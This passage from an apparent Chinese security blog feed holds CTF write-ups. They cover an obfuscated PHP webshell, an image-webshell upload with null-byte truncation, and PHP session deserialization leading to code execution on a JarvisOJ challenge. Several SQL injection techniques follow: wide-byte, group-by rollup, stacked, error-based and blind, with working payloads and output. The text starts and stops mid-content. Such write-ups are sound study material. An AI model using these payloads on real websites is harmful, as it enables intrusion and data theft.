(&quot;(&quot;^&quot;w&quot;).(&quot;j&quot;^&quot;:&quot;). (&quot;i&quot;^&quot;&amp;&quot;). (&quot;#&quot;^&quot;p&quot;). (&quot;&gt;&quot;^&quot;j&quot;). (&quot;!&quot;^&quot;z&quot;). (&quot;T&quot;^&quot;g&quot;). (&quot;e&quot;^&quot;S&quot;). (&quot;_&quot;^&quot;o&quot;). (&quot;?&quot;^&quot;b&quot;). (&quot;]&quot;^&quot;t&quot;));?&gt;</code></pre><p>运行结果</p><pre><code>Notice: Undefined offset: 360 in E:\only_for_code_test.php(1) : assert code on line 1Warning: assert(): Assertion &quot;eval($_POST[360])&quot; failed in E:\only_for_code_test.php on line 1</code></pre><p>菜刀连一下php文件即可得到flag</p><h3 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h3><p>上传页面上传图片马得到图片ID</p><p>图片马 ：<code>copy 1.jpg/b+1.php 2.jpg</code></p><p>直接访问/uploads/ID看不到图片，同时view页面也没有什么卵用，观察URL</p><p>访问</p><pre><code>http://web.jarvisoj.com:32785/index.php/index.php?page=uploads/1566654901.jpg</code></pre><p>看到回显</p><p>Warning: fopen(uploads/1566654901.jpg.php): failed to open stream: No such file or directory in /opt/lampp/htdocs/index.php on line 24<br>No such file!</p><p>尝试%00截断</p><pre><code>GET /index.php?page=uploads/1566655841.jpg%00 HTTP/1.1</code></pre><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><blockquote><p><a href="http://www.qingpingshan.com/bc/php/394154.html" target="_blank" rel="noopener">http://www.qingpingshan.com/bc/php/394154.html</a></p><p><a href="https://www.t00ls.net/articles-48721.html#" target="_blank" rel="noopener">https://www.t00ls.net/articles-48721.html#</a></p><p><a href="https://xz.aliyun.com/t/3674#toc-14" target="_blank" rel="noopener">https://xz.aliyun.com/t/3674#toc-14</a></p></blockquote><blockquote><p><a href="https://xz.aliyun.com/t/2563#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/2563#toc-2</a></p><p><a href="https://www.jianshu.com/p/5342d07a6956" target="_blank" rel="noopener">https://www.jianshu.com/p/5342d07a6956</a><br><a href="https://www.freebuf.com/articles/web/69264.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/69264.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
            <tag> serialize </tag>
            
            <tag> SQL </tag>
            
            <tag> 哈希长度扩展攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Session_unserlize</title>
      <link href="/2019/08/01/session-unserialize/"/>
      <url>/2019/08/01/session-unserialize/</url>
      
        <content type="html"><![CDATA[<p>session的反序列化利用</p><a id="more"></a><p>8/1/2019 10:44:57 AM </p><h2 id="对魔法函数的再次认识"><a href="#对魔法函数的再次认识" class="headerlink" title="对魔法函数的再次认识"></a>对魔法函数的再次认识</h2><h3 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h3><pre><code>__construct()//创建对象时触发__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问的属性读取数据__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__invoke() //当脚本尝试将对象调用为函数时触发</code></pre><h4 id="序列化机制"><a href="#序列化机制" class="headerlink" title="序列化机制"></a>序列化机制</h4><pre><code>Strings:size:value;Integeri:value;Booleanb:value; (does not store &quot;true&quot; or &quot;false&quot;, does store &apos;1&apos; or &apos;0&apos;)NullN;Arraya:size:{key definition;value definition;(repeated per element)}ObjectO:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}</code></pre><h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h4><blockquote><p>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并<strong>返回一个包含对象中所有应被序列化的变量名称的数组</strong>。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。</p></blockquote><p>也就是说序列化时没有被利用到的属性会被清理。</p><h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h4><blockquote><p>unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</p></blockquote><p>也就是说会在<code>unserilize</code>之前准备好可能会用到的对象资源</p><p>拿<a href="https://xz.aliyun.com/t/3674#toc-5" title="师傅博客" target="_blank" rel="noopener">https://xz.aliyun.com/t/3674#toc-5</a>师傅文章的代码做个例子：</p><pre><code>&lt;?php class Caiji{public function __construct($ID, $sex, $age){$this-&gt;ID = $ID;$this-&gt;sex = $sex;$this-&gt;age = $age;$this-&gt;info = sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age);}public function getInfo(){echo $this-&gt;info . &apos;&lt;br&gt;&apos;;}/** * serialize前调用 用于删选需要被序列化存储的成员变量 * @return array [description] */public function __sleep(){echo __METHOD__ . &apos;&lt;br&gt;&apos;;return [&apos;ID&apos;, &apos;sex&apos;, &apos;age&apos;];}/** * unserialize前调用 用于预先准备对象资源 */public function __wakeup(){echo __METHOD__ . &apos;&lt;br&gt;&apos;;$this-&gt;info = sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age);}}$me = new Caiji(&apos;Luc1fer&apos;, 20, &apos;male&apos;);$me-&gt;getInfo();//存在__sleep(函数，$info属性不会被存储$temp = serialize($me);echo $temp . &apos;&lt;br&gt;&apos;;$me = unserialize($temp);//__wakeup()组装的$info$me-&gt;getInfo();?&gt;</code></pre><p>执行结果如下 ：</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5jyd32htkj30iv04dt8q.jpg" alt="魔法函数执行结果"></p><p>如果看不太清楚函数的用法，我们可以再改一下代码看看效果，我们这次注释掉了<code>__sleep()</code>函数，并且在其他函数里增加了提示语句：</p><p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5jyiiweobj30ox05n0sx.jpg" alt="修改之后的效果"></p><p>可以看到因为<code>sleep</code>的存在，<code>info</code>属性被删除，导致<code>getinfo()</code>使用时无法打印<code>Info</code>属性，在我们注释掉<code>sleep</code>之后，所有的属性都正常打印了，<code>wakeup</code>也是如此。</p><h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h4><blockquote><p>__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条E_RECOVERABLE_ERROR 级别的致命错误。</p></blockquote><pre><code>&lt;?php class Caiji{public function __construct($ID, $sex, $age){$this-&gt;ID = $ID;$this-&gt;sex = $sex;$this-&gt;age = $age;$this-&gt;info = sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age);}public function __toString(){return $this-&gt;info;}}$me = new Caiji(&apos;twosmi1e&apos;, 20, &apos;male&apos;);echo &apos;__toString:&apos; . $me . &apos;&lt;br&gt;&apos;;?&gt;__toString:ID: twosmi1e, age: 20, sex: male</code></pre><h2 id="session-反序列化"><a href="#session-反序列化" class="headerlink" title="session 反序列化"></a>session 反序列化</h2><p>PHP在session存储和读取时都会有一个序列化和反序列化的过程，php内置了多种处理器用于存取$_SESSION数据，对数据进行序列化与反序列化。</p><p>这是php.ini中的配置项</p><p><img src="https://raw.githubusercontent.com/twosmi1e/twosmi1e.github.io/master/2018/12/20/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1545234989274.png" alt="phpinfo配置"><br><img src="https://raw.githubusercontent.com/twosmi1e/twosmi1e.github.io/master/2018/12/20/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1545235002297.png" alt></p><ul><li><code>session.save_path</code> 设置session的存储路径</li><li><code>session.save_handler</code> 设定用户自定义存储函数</li><li><code>session.auto_start</code> 指定会话模块是否在请求开始时启动一个会话</li><li><code>session.serialize_handler</code> 定义用来序列化/反序列化的处理器名字。默认使用php</li></ul><p>对于处理器，常用的有三种，对应三种不同的处理格式</p><p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5jzfr3tdsj30nx066q3f.jpg" alt="处理器的处理方式"></p><p>我们可以看看不同储存方式储存的区别：</p><p>选择不同的处理器来生成session，生成的文件就储存在上图对应目录中</p><pre><code>&lt;?ini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);session_start();$_SESSION[&apos;name&apos;] = &apos;Luc1fer&apos;;?&gt;php_serilize: a:1:{s:4:&quot;name&quot;;s:7:&quot;Luc1fer&quot;;}php: name|s:7:&quot;Luc1fer&quot;;php_binary: EOTnames:7:&quot;Luc1fer&quot;;</code></pre><p>如果<strong>PHP在反序列化存储的$_SESSION数据时使用的处理器和序列化使用的处理器不同</strong>，会导致数据无法正确反序列化，通过特殊构造甚至可以伪造任意数据。</p><h3 id="设置session序列化方法可能带来的隐患"><a href="#设置session序列化方法可能带来的隐患" class="headerlink" title="设置session序列化方法可能带来的隐患"></a>设置session序列化方法可能带来的隐患</h3><p>如果我们创建一个写入session的脚本</p><pre><code>&lt;?phpini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);session_start();$name = $_GET[&apos;name&apos;] ? $_GET[&apos;name&apos;] : &quot;name&quot;; $value = $_GET[&apos;value&apos;] ? $_GET[&apos;value&apos;] : &quot;value&quot;;$_SESSION[name] = $value;  if(isset($_GET[&apos;clean&apos;])) session_destroy();</code></pre><p>此时我们传入<code>value=|s:5:&quot;hack!&quot;;</code>,在进行session存储时的内容就会变成：<code>a:1:{s:4:&quot;name&quot;;s:13:&quot;|s:5:&quot;hack!&quot;;&quot;;}</code>.我们可以知道在<code>php_serialize</code>中<code>a</code>代表一个数组，包含一个元素，但是如果其他的php页面没有设置处理器为<code>php_serialize</code>而使用默认的php，那么在php解释session中的内容时，<code>|</code>前的部分会被解释称键，后的部分会被解释成值，在这里我们传入的<code>s:5:&quot;hack!&quot;;</code>会被解析成<code>hack!&quot;</code>，后面的<code>&quot;;</code>会被忽略。,最后解析的结果就是<code>Array ([a:1:{s:4:&quot;name&quot;;s:13:&quot;}]=&gt;hack!)</code>。</p><p>我们可以通过此来利用反序列化漏洞。</p><h3 id="session-upload-progress"><a href="#session-upload-progress" class="headerlink" title="session.upload_progress"></a>session.upload_progress</h3><blockquote><p>Session 上传进度 </p></blockquote><blockquote><p>当 session.upload_progress.enabledINI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态 </p></blockquote><blockquote><p>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。通常这些键值可以通过读取INI设置来获得。</p></blockquote><p>在POST一个文件前，通过<code>POST</code>一个name为<code>Session.upload_progress</code>，value为用户自定义的一个upload_id。在文件上传过程中会生成上传信息。在上传结束后session中的键值对会直接消失。</p><p>同时还要注意<code>session.upload_progress.cleanup</code>这个参数，这个选项的意思是在上传完成时从session中清除上传进度信息，默认开启。在关闭后上传信息会一直保存在session中。</p><p>通过上面两部分我们可以更改session为自定义数据。</p><h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h3><p>JarvisOJ上的题目，题目链接：<a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/</a></p><pre><code>&lt;?php//A webshell is wait for youini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);session_start();class OowoO{    public $mdzz;    function __construct()    {        $this-&gt;mdzz = &apos;phpinfo();&apos;;    }    function __destruct()    {        eval($this-&gt;mdzz);    }}if(isset($_GET[&apos;phpinfo&apos;])){    $m = new OowoO();}else{    highlight_string(file_get_contents(&apos;index.php&apos;));}?&gt;</code></pre><p>观察到题目phpinfo中的配置</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5k7ltycs7j30we056t8z.jpg" alt></p><p>构造一个POST页面</p><pre><code>&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;&lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt;</code></pre><p>由题目的<code>phpinfo</code>可知，全局session序列化器设置为了<code>php_serialize</code>，因此<code>upload_progress</code>会用<code>php_serialize</code>的方式创建<code>session</code>文件.在执行<code>index.php</code>时，该代码将处理器设置为了php,然后<code>session_start()</code>来读取session文件。由上文的php序列化器处理方式可知我们在session中构造<code>|序列化字符串</code>就可以。同时该题目的<code>cleanup</code>也设置为了<code>off</code></p><p>然后进行序列化。将处理器设置为<code>php_serialize</code></p><pre><code>&lt;?php//A webshell is wait for youini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);session_start();class OowoO{public $mdzz;}$a = new OowoO();$a-&gt;mdzz = &apos;print_r(scandir(dirname(__FILE__)));&apos;;echo serialize($a);?&gt;</code></pre><p>得到</p><pre><code>O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}</code></pre><p>先在本地打开POST页面，随便提交一个东西然后抓包将<code>filename</code>改为序列化字符串。同时为了达到我们想要的结果要在最前面加上<code>|</code>，同时为了防止转义，在引号前面加上<code>\</code>.</p><p>读到如下信息</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5k7lqvj32j30r807jgmn.jpg" alt></p><p>由<code>phpinfo</code>中<code>Apache Environment</code>可知题目路径为<code>/opt/lampp/htdocs/index.php</code></p><p>于是我们修改mdzz的值为</p><pre><code>print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));</code></pre><p>得到</p><pre><code>O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;}</code></pre><p>提交得到flag</p><pre><code>$flag=&quot;CTF{4d96e37f4be998c50aa586de4ada354a}&quot;</code></pre><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><blockquote><p><a href="http://www.qingpingshan.com/bc/php/394154.html" target="_blank" rel="noopener">http://www.qingpingshan.com/bc/php/394154.html</a></p><p><a href="https://www.t00ls.net/articles-48721.html#" target="_blank" rel="noopener">https://www.t00ls.net/articles-48721.html#</a></p><p><a href="https://xz.aliyun.com/t/3674#toc-14" target="_blank" rel="noopener">https://xz.aliyun.com/t/3674#toc-14</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> serialize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL</title>
      <link href="/2019/07/28/SQL/"/>
      <url>/2019/07/28/SQL/</url>
      
        <content type="html"><![CDATA[<p>大大小小比赛碰到了好多要不没见过要不不会的注入，这里记录一下吧</p><a id="more"></a><hr><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>GBK是一种多字符的编码，通常来说，一个GBK编码的字符占用两个字节，一个UTF-8的字符占用三个字节。</p><p><strong>转义字符</strong>：为了过滤用户输入数据，对一些特殊字符加上反斜杠”<br>“进行转义，mysql中转义函数有</p><pre><code>addslashes,mysql_real_escape_string,mysql_escape_string等，还有一种是配置magic_quote_gpc,不过高版本已经移除该功能</code></pre><p><strong>宽字节注入</strong>是指mysql数据库在使用GBK编码时会认为两个字符是一个汉子(前一个字符的ascii码要大于128才到汉字范围)，而且当我们引入单引号时，mysql会调用转义函数，将单引号变为&#39;,其中的 \ 十六进制为%5C,mysql的GBK编码会认为 %df%5C 是一个宽字节，从而使单引号闭合(逃逸)，从而注入攻击。</p><p><strong>sql数据的变化过程</strong></p><pre><code>%df%27--&gt;addslashes()--&gt;%df%5C%27--&gt;GBK--&gt;運&apos;用户输入--&gt;过滤函数--&gt;代码层$sql--&gt;mysql处理请求--&gt;mysql中的sql</code></pre><p>测试题目是南邮的GBK injection</p><p>测试发现加上单引号没有报错但是有转义操作，在单引号前面插入了反斜杠</p><pre><code>?id=1&apos;        your sql:select id,title from news where id = &apos;1\&apos;&apos;</code></pre><p>进行宽字节注入</p><pre><code>?id=1%df%27your sql:select id,title from news where id = &apos;1運&apos;&apos;</code></pre><p>如上所述，加入%df之后mysql认为%df%5C是一个汉字，这样单引号就逃逸出来，但是这里还会报错，因为我们人为的闭合了一个单引号之后查询语句长这样</p><pre><code>id=&apos;運&apos;&apos;</code></pre><p>我们还要把最后一个单引号注释掉才行</p><pre><code>?id=1%df%27%23</code></pre><p>注入成功，该查询字段数，查询字段数要用union探测内容，而union得规则是必须列数相同才能正常展示，所以要探测列数，保证构造的查询结果与元数据查询结果的数据结构相同；’order by 1’代表按第一列升序排列，数字代表的列不存在就会报错</p><pre><code>?id=1%df%27 order by 2 %23your sql:select id,title from news where id = &apos;1運&apos; order by 2 #&apos;here is the information</code></pre><p>再探测字段的显示位，即表中数据第几位的字段可以显示。id的值要用-1或者表中没有用过的id值，否则测试值会被覆盖。</p><p>接下来就是常规的注入</p><pre><code>数据库?id=-1%df%27 union select 1,group_concat(database()) %23表?id=-1%df%27 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() %23字段?id=-1%df%27% union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634 %23因为这对单引号的转义，我们使用十六进制来读取信息?id=-1%df%27 union select 1,group_concat(flag) from ctf4 %23</code></pre><h2 id="ISCC中碰到的group-by…with-rollup"><a href="#ISCC中碰到的group-by…with-rollup" class="headerlink" title="ISCC中碰到的group by…with rollup"></a>ISCC中碰到的group by…with rollup</h2><p>题目来自ISCC线下赛hint.txt</p><pre><code>$sql=&quot;SELECT pwd FROM user WHERE uname = &apos;{$_POST[&apos;uname&apos;]}&apos;&quot;;$query = mysqli_query($con,$sql); if (mysqli_num_rows($query) == 1) {     $key = mysqli_fetch_array($query);    if($key[&apos;pwd&apos;] == $_POST[&apos;pwd&apos;]) {        echo &quot;xxxxxxxxx&quot;;    }else{        echo &quot;你这密码不太对啊&quot;;    }}else if(mysqli_num_rows($query) == 0){    echo &quot;你这密码不太对啊&quot;;}else{    echo &quot;数据太多了&quot;;}</code></pre><p>分析题目可知我们需要post一个uname，进行弱比较相等，使得查询结果为空，然后我们也post一个空值就行了。</p><p>group by 分析</p><pre><code>mysql&gt; select * from member;+----+----------+--------------------------------------+-------------------+| id | username | pws                                  | email             |+----+----------+--------------------------------------+-------------------+|  1 | vince    | e10adc3949ba59abbe56e                   | vince@pikachu.com ||  2 | allen    | e10adc3949ba59abbe56e                   | allen@pikachu.com ||  3 | kobe     | e10adc3949ba59abbe56ekes                | kobe@pikachu.com  ||  4 | grady    | e10adc3949ba59abbe56e                 | grady@pikachu.com ||  5 | kevin    | e10adc3949ba59abbe56ema City Thunder | kevin@pikachu.com ||  6 | lucy     | e10adc3949ba59abbe56e                   | lucy@pikachu.com  ||  7 | lili     | e10adc3949ba59abbe56e                   | lili@pikachu.com  |+----+----------+--------------------------------------+-------------------+mysql&gt; select username from member where sex=&apos;boy&apos; group by username;+----------+| username |+----------+| allen|| grady|| kevin|| kobe || vince|+----------+5 rows in set (0.00 sec)</code></pre><p>group by 对结果进行分类，而with rollup字句将在查询的结果最后一行添上一行数据，来显示分组统计的基础上再进行数据的汇总，但是这里的汇总不是简单的求和，而是要根据对数据处理采用的函数决定的</p><pre><code>mysql&gt; select username from member where sex=&apos;boy&apos; group by username with rollup;+----------+| username |+----------+| allen|| grady|| kevin|| kobe || vince|| NULL |+----------+6 rows in set (0.00 sec)</code></pre><p>对于这个题目，我们需要使得查询的结果不为空。可以使用异或来绕过判断。同时配合php的比较特性来绕过对uname的判断。</p><pre><code> mysql&gt; select 1^1;+-----+| 1^1 |+-----+|   0 |+-----+1 row in set (0.00 sec)mysql&gt; select &apos;aaa&apos;=1;+---------+| &apos;aaa&apos;=1 |+---------+|   0 |+---------+1 row in set, 1 warning (0.00 sec)mysql&gt; select &apos;id&apos;=0;+--------+| &apos;id&apos;=0 |+--------+|  1 |+--------+1 row in set, 1 warning (0.00 sec)mysql&gt; select &apos;id111&apos;=0;+-----------+| &apos;id111&apos;=0 |+-----------+| 1 |+-----------+1 row in set, 1 warning (0.00 sec)</code></pre><p>​<br>    uname=’1’^1–&gt;uname=0–&gt;相等<br>    #异或操作对任一操作数为NULL则返回NULL，对于非NULL得操作数，如果奇数个操作数非零，则值为1，否则为零。</p><p>最后payload为：</p><pre><code>uname=&apos;1&apos;^1 group by pwd with rollup limit 1 offset 1%23&apos;</code></pre><p>稍微解释一下limit offset</p><pre><code>mysql&gt; select * from member limit 3 offset 1;+----+----------+----------------------------------+-----+-------------+-----------+-------------------+| id | username | pw   | sex | phonenum| address   | email |+----+----------+----------------------------------+-----+-------------+-----------+-------------------+|  2 | allen| e10adc3949ba59abbe56e057f20f883e | boy | 13676767767 | nba 76   | allen@pikachu.com ||  3 | kobe | e10adc3949ba59abbe56e057f20f883e | boy | 15988767673 | nba lakes | kobe@pikachu.com  ||  4 | grady| e10adc3949ba59abbe56e057f20f883e | boy | 13676765545 | nba hs   | grady@pikachu.com |+----+----------+----------------------------------+-----+-------------+-----------+-------------------+3 rows in set (0.00 sec)从第一行开始打印3行数据mysql&gt; select * from member limit 1,3;+----+----------+----------------------------------+-----+-------------+-----------+-------------------+| id | username | pw   | sex | phonenum| address   | email |+----+----------+----------------------------------+-----+-------------+-----------+-------------------+|  2 | allen| e10adc3949ba59abbe56e057f20f883e | boy | 13676767767 | nba 76   | allen@pikachu.com ||  3 | kobe | e10adc3949ba59abbe56e057f20f883e | boy | 15988767673 | nba lakes | kobe@pikachu.com  ||  4 | grady| e10adc3949ba59abbe56e057f20f883e | boy | 13676765545 | nba hs   | grady@pikachu.com |+----+----------+----------------------------------+-----+-------------+-----------+-------------------+3 rows in set (0.00 sec)从第一行开始打印三行</code></pre><p>为什么不直接用limit 1，1 呢？因为过滤了逗号。</p><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>堆叠查询可以执行多条SQL语句，之间用分号’;’隔开.与union select 联合查询不同，堆叠查询可以执行任何语句，而后者只能执行有限的(列数相同)。</p><pre><code>mysql&gt; show tables;+----------------+| Tables_in_ctf4 |+----------------+| admin           || news           |+----------------+2 rows in set (0.00 sec)mysql&gt; select * from admin;select * from news;+-----+-------+----------------------------------+| uid | name  | pass                              |+-----+-------+----------------------------------+|   1 | admin | 21232f297a57a5a743894a0e4a801fc3 |+-----+-------+----------------------------------+1 row in set (0.04 sec)+-----+--------+--------------------------+| tid | title  | content                    |+-----+--------+--------------------------+|   1 | heihei | 绂绘垚鍔熷張杩戜簡涓€姝?    ||   2 | haha   | 椹笂灏辨垚鍔熶簡          |+-----+--------+--------------------------+2 rows in set (0.03 sec)</code></pre><p>堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。做过的几道题都是用的MariaDB</p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><ul><li>关键函数</li></ul><p>rand() 用于产生一个0~1的随机数</p><p>floor() 向下取整</p><p>rand()函数生成0~1的函数，使用floor()函数向下取整，值是固定的’0’，我们将rand*2，得到的值就是不固定的0或者1。</p><p>这里为什么不能直接用一个固定的常量比如1,0？而必须使用随机函数？因为我们需要使用函数在调用时会被执行的特点。</p><p>这是一句简单的查询语句</p><pre><code>select floor(rand(0)*2) from information_schema.tables;</code></pre><p>加上随机种子后是一个伪随机序列。同时这个报错也与数据量有关，这个我们下文会分析</p><p>伪随机的序列前几位是</p><pre><code>+------------------+| floor(rand(0)*2) |+------------------+|                0 ||                1 ||                1 ||                0 ||                1 ||                1 ||                0 ||                0 ||                1 ||                1 ||                1 ||                0 ||                1 ||                1 |</code></pre><p>我们使用count()和group by 来对结果进行统计，这里不加种子。</p><pre><code>select count(*) from information_schema.tables group by floor(rand()*2);+----------+| count(*) |+----------+|       47 ||       50 |+----------+</code></pre><p>经过测试发现不加种子也有出现报错的几率，但是我们加上种子之后必然会报错。在了解原因之前我们还要再了解一下count()函数</p><ul><li>count()</li></ul><p>在进行count时对查到的数据会创建一个虚拟表用来保存结果。如果key的结果在虚拟表中已经存在则count的结果加一，否则就插入新纪录。</p><p>由上文可知，floor(rand(0)*2)的结果是固定的’011011’，所以报错的原因应该是floor(rand(0)*2)的多次计算导致的。</p><pre><code>floor(rand(0*2)        0110110            查到0，虚拟表中不存在，执行插入1            插入insert floor(rand(0)*2) into tablename;插入时再次调用函数也就是说插入的是11            表中存在,count+10            查到0，不存在，进行插入1            插入insert floor(rand(0)*2) into tablename;插入时再次调用函数也就是说插入的是11            报错key            count1            1+11            报错</code></pre><p>从这里我们可以看到存在两个相同的key，主键唯一的，所以报错。表里有大于等于三条数据时就会报错。</p><p>那前面说的不加种子也有几率报错是为什么？</p><p>其实只要满足下面的条件就可以报错</p><pre><code>查询              虚拟表插入第一次计算         第二次计算第三次计算         第四次计算</code></pre><p>只要第三次结果与第二第四都不同，同时第二第四计算相同即可</p><p>我们构造下面的语句</p><pre><code>select count(*),concat(user(),floor(rand(0)*2)) x from information_schema.tables group by x;ERROR 1062 (23000): Duplicate entry &apos;root@localhost1&apos; for key &apos;group_key&apos;</code></pre><p>成功返回信息</p><p>如果不携带uesr()，报的是11，也就是说是concat()函数部分执行了语句</p><pre><code>select count(*) from information_schema.tables group by concat(1,floor(rand(0)*2));ERROR 1062 (23000): Duplicate entry &apos;11&apos; for key &apos;group_key&apos;</code></pre><ul><li>其他函数</li></ul><p>updataxml()</p><pre><code>select * from user where username = &apos;admin&apos; or updatexml(1,concat(0x7e,(database())),0);ERROR 1105 (HY000): XPATH syntax error: &apos;~test1&apos;</code></pre><p>因为第二个参数需要Xpath格式，输入不符合就报错，最大长度为32位,extractvalue()也是如此</p><p>extractvalue()</p><pre><code>select * from user where username = &apos;admin&apos; and extractvalue(1,concat(0x7e,(select database())))ERROR 1105 (HY000): XPATH syntax error: &apos;~test1&apos;</code></pre><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>主要两种，即 <strong>时间盲注</strong> ， <strong>布尔盲注</strong></p><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>*<em>函数 *</em> </p><p>sleep() 睡眠时间为参数设定的秒数，然后返回0。若sleep()被中断，返回1。<br>假如这里我们有一张表</p><pre><code>mysql&gt; select * from user;+----+--------------------------------+----------+| id | username                       | password |+----+--------------------------------+----------+|  1 | admin                          | 1234567  ||  2 | 012345678901234567890123456789 | 1234567  ||  3 | 012345678901234567890123456789 | 1234567  ||  4 | admin                          | 11111    ||  5 | admin                          | 222222   ||  6 | admin                          | 33333    |+----+--------------------------------+----------+6 rows in set (0.00 sec)</code></pre><p>我们尝试查询一条数据并设置时间为3s</p><pre><code>select * from user where id = 1 and sleep(3);Empty set (3.00 sec)</code></pre><p>可以看到成功延时了3s.如果我们查一条表里不存在的数据，则会直接返回，不执行sleep()。</p><pre><code>select * from user where id = 9999 and sleep(3);Empty set (0.00 sec)</code></pre><p>and前面的条件为假，后面的就不再看了。同样的我们测试or</p><pre><code>select * from user where id = 1 or sleep(3);+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | admin    | 1234567  |+----+----------+----------+1 row in set (15.01 sec)</code></pre><p>发现时间为15s,我们可以想想表里一共有6条数据，查到第一条数据时id=1为真，此时or后面的表达式不再起作用，剩下的五条数据都为假，执行5次sleep(3),因此时间为15s。</p><p>*<em>配合if条件触发 *</em></p><p>if(expr1,expr2,expr3)<br>如果expr1是TRUE(expr1&lt;&gt;0 and expr1&lt;&gt; NULL),则IF()的返回值为expr2；否则返回值是expr3。IF()的返回值为数字或则字符串具体情况视其所在语境而定。</p><p>疑问 </p><pre><code>mysql&gt; select * from user where id = 7 or if(1,1,0);+----+--------------------------------+----------+| id | username                       | password |+----+--------------------------------+----------+|  1 | admin                          | 1234567  ||  2 | 012345678901234567890123456789 | 1234567  ||  3 | 012345678901234567890123456789 | 1234567  ||  4 | admin                          | 11111    ||  5 | admin                          | 222222   ||  6 | admin                          | 33333    |+----+--------------------------------+----------+6 rows in set (0.00 sec)mysql&gt; select * from user where id = 1 or if(1,1,0);+----+--------------------------------+----------+| id | username                       | password |+----+--------------------------------+----------+|  1 | admin                          | 1234567  ||  2 | 012345678901234567890123456789 | 1234567  ||  3 | 